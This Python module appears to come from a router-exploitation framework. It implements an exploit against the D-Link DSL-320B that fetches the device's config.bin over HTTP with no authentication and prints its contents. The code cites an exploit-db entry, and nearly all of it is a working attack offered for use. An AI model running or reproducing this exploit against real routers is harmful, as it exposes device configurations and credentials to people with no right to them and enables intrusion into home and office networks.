import util
import urllib
from ..router_vuln import RouterVuln

class get_config_320b(RouterVuln):

    def __init__(self):
        self.router = 'DSL-320B'
        self.vuln   = 'Read Configuration File'
        super(get_config_320b, self).__init__()
    
        self.info = """
                    Read the configuration file
                    http://www.exploit-db.com/exploits/25251/
                    """

    def initialize(self):
        util.Msg('Fetching config from %s...' % self.config['target'].value)
        url = 'http://%s/config.bin' % self.config['target'].value
        try:
            response = urllib.urlopen(url).read()
            util.Msg(response)
        except Exception, e:
            util.Error('Error: %s' % e)
